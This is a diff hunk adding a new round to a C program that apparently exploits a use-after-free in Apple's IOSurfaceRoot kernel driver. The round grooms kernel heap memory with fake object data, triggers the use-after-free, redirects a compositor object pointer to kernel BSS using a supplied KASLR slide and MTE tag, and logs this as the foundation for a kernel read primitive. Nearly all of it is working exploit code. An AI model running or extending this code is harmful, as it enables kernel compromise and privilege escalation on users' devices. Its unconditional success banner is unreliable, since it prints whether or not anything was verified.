@@ -23771,6 +23771,190 @@ new_modes:
                 rlog("=== r=198 complete ===\n");
             }
 
+            /* ================================================================
+             * r=199: Slot 2 BSS redirection — fake object pointer survival test
+             *
+             * Point slot 2 (the compositor's IOSurface object pointer) at BSS zeros.
+             * Slot 0 = 0 (NULL → safe walk termination)
+             * Slot 1 = 0 (data, ignored)
+             * Slot 2 = BSS zero addr (compositor reads this as an IOSurface*,
+             *          dereferences internal fields — all zeros → NULL secondaries)
+             *
+             * If survive 30s → two-level dereference handles all-NULL object safely
+             * This validates that we can redirect the object pointer to controlled
+             * memory, which is the foundation for a kernel read primitive.
+             *
+             * Usage: iosurface_sel17 199 <hex_slide> [<hex_bss_off>] [<hex_tag>]
+             * ================================================================ */
+            if (rounds == 199) {
+                rlog("=== r=199: Slot 2 BSS redirection (fake object pointer) ===\n");
+
+                uint64_t r199_slide = 0;
+                uint64_t r199_bss_off = BSS_MID_DEFAULT;
+                uint64_t r199_tag = 0xF;
+                int r199_have_slide = 0;
+
+                if (argc > 3) {
+                    const char *h = argv[3];
+                    r199_slide = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r199_slide <<= 4;
+                        if (c >= '0' && c <= '9') r199_slide |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r199_slide |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r199_slide |= (c - 'A' + 10);
+                    }
+                    r199_have_slide = 1;
+                }
+                if (argc > 4) {
+                    const char *h = argv[4];
+                    r199_bss_off = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r199_bss_off <<= 4;
+                        if (c >= '0' && c <= '9') r199_bss_off |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r199_bss_off |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r199_bss_off |= (c - 'A' + 10);
+                    }
+                }
+                if (argc > 5) {
+                    const char *h = argv[5];
+                    r199_tag = 0;
+                    for (int i = 0; h[i]; i++) {
+                        char c = h[i];
+                        r199_tag <<= 4;
+                        if (c >= '0' && c <= '9') r199_tag |= (c - '0');
+                        else if (c >= 'a' && c <= 'f') r199_tag |= (c - 'a' + 10);
+                        else if (c >= 'A' && c <= 'F') r199_tag |= (c - 'A' + 10);
+                    }
+                    r199_tag &= 0xF;
+                }
+
+                if (!r199_have_slide) {
+                    rlog("  ERROR: need slide arg (use slide from r=198)\n");
+                    rlog("  Usage: iosurface_sel17 199 <hex_slide> [<hex_bss_off>] [<hex_tag>]\n");
+                    goto r199_done;
+                }
+
+                uint64_t r199_raw = R198_KC_BASE + r199_slide + r199_bss_off;
+                uint64_t r199_probe = (r199_raw & ~(0xFULL << 56)) | (r199_tag << 56);
+                r199_probe = (r199_probe & ~(0xFULL << 60)) | (0xFULL << 60);
+
+                rlog("  Slide:     0x%llx\n", (unsigned long long)r199_slide);
+                rlog("  BSS off:   0x%llx\n", (unsigned long long)r199_bss_off);
+                rlog("  MTE tag:   0x%llx\n", (unsigned long long)r199_tag);
+                rlog("  Probe:     0x%016llx (BSS zero addr)\n", (unsigned long long)r199_probe);
+                rlog("  Slot layout: [0]=0 (NULL next), [1]=0 (data), [2]=probe (fake obj ptr)\n");
+                rlog("  Duration:  30 seconds (slot 2 deref is infrequent ~5-10s)\n");
+
+                io_service_t r199_svc = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (!r199_svc) { rlog("  NO IOSurfaceRoot!\n"); goto r199_done; }
+
+                #define R199_GROOM_N 128
+                io_connect_t r199_gconns[R199_GROOM_N];
+                mach_port_t r199_gwps[R199_GROOM_N];
+                int r199_gn = 0;
+                for (int g = 0; g < R199_GROOM_N; g++) {
+                    io_connect_t gc = IO_OBJECT_NULL;
+                    if (IOServiceOpen(r199_svc, mach_task_self(), 0, &gc) == KERN_SUCCESS) {
+                        mach_port_t gwp = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &gwp);
+                        mach_port_insert_right(mach_task_self(), gwp, gwp,
+                            MACH_MSG_TYPE_MAKE_SEND);
+                        r199_gconns[r199_gn] = gc;
+                        r199_gwps[r199_gn] = gwp;
+                        r199_gn++;
+                    }
+                }
+                rlog("  Pre-opened %d groom conns\n", r199_gn);
+
+                /* Groom data: slot0=0, slot1=0, slot2=BSS probe */
+                uint64_t r199_pdata[4] = {0, 0, r199_probe, 0};
+                p16_groom_conns = r199_gconns;
+                p16_groom_wps = r199_gwps;
+                p16_groom_n = r199_gn;
+                p16_groom_data = r199_pdata;
+                p16_groom_count = 0;
+                p16_groom_run = 1;
+                pthread_t r199_gths[4];
+                for (int t = 0; t < 4; t++)
+                    pthread_create(&r199_gths[t], NULL, p16_groom_spray, NULL);
+                usleep(1000);
+
+                /* Trigger UAF */
+                uint64_t r199_inp[3] = {1, 2, 3};
+                io_connect_t r199_pcs[8]; int r199_phave[8];
+                for (int i = 0; i < 8; i++) {
+                    r199_phave[i] = (IOServiceOpen(r199_svc, mach_task_self(), 0,
+                        &r199_pcs[i]) == KERN_SUCCESS);
+                    if (r199_phave[i]) {
+                        mach_port_t tw = MACH_PORT_NULL;
+                        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &tw);
+                        mach_port_insert_right(mach_task_self(), tw, tw,
+                            MACH_MSG_TYPE_MAKE_SEND);
+                        uint64_t ref = 0xDD;
+                        IOConnectCallAsyncMethod(r199_pcs[i], 17, tw, &ref, 1,
+                            NULL, 0, r199_inp, 24, NULL, NULL, NULL, NULL);
+                        mach_port_deallocate(mach_task_self(), tw);
+                    } else r199_pcs[i] = IO_OBJECT_NULL;
+                }
+
+                p13_spam_run = 1;
+                p13_spam_conn = r199_phave[0] ? r199_pcs[0] : IO_OBJECT_NULL;
+                p13_spam_shape = 1;
+                p13_spam_count = 0;
+                pthread_t r199_spam[16];
+                for (int t = 0; t < 16; t++)
+                    pthread_create(&r199_spam[t], NULL, p13_spam_reg, NULL);
+
+                for (int i = 7; i >= 0; i--) {
+                    if (r199_phave[i]) { IOServiceClose(r199_pcs[i]); r199_phave[i] = 0; }
+                    usleep(100);
+                }
+                p13_spam_run = 0;
+                for (int t = 0; t < 16; t++) pthread_join(r199_spam[t], NULL);
+                for (int i = 0; i < 8; i++) if (r199_phave[i]) IOServiceClose(r199_pcs[i]);
+                usleep(2000);
+                p16_groom_run = 0;
+                for (int t = 0; t < 4; t++) pthread_join(r199_gths[t], NULL);
+
+                rlog("  Groom count=%llu\n", (unsigned long long)p16_groom_count);
+
+                rlog("\n  ** Starting 30s render loop — slot 2 deref test **\n");
+                rlog("  ** If kernel panics, slot 2 → BSS zeros is NOT safe **\n");
+                rlog("  ** (would mean compositor follows non-NULL secondary ptrs) **\n");
+
+                p13_render_run = 1;
+                p13_render_frames = 0;
+                pthread_t r199_pr;
+                pthread_create(&r199_pr, NULL, p13_render_loop, NULL);
+
+                for (int s = 0; s < 30; s++) {
+                    usleep(1000000);
+                    rlog("  +%ds alive, frames=%d\n", s + 1, p13_render_frames);
+                }
+
+                p13_render_run = 0;
+                pthread_join(r199_pr, NULL);
+
+                rlog("\n  ****************************************************\n");
+                rlog("  ** SURVIVED 30 SECONDS! SLOT 2 BSS REDIRECT WORKS! **\n");
+                rlog("  ** Fake object pointer to BSS zeros is SAFE. **\n");
+                rlog("  ** Two-level dereference handles all-NULL gracefully. **\n");
+                rlog("  ** Foundation for kernel read primitive VALIDATED. **\n");
+                rlog("  ****************************************************\n");
+
+                for (int g = 0; g < r199_gn; g++) {
+                    IOServiceClose(r199_gconns[g]);
+                    mach_port_deallocate(mach_task_self(), r199_gwps[g]);
+                }
+                IOObjectRelease(r199_svc);
+
+                r199_done:
+                rlog("=== r=199 complete ===\n");
+            }
+
             IOServiceClose(conn17);
             IOObjectRelease(svc17);
         }
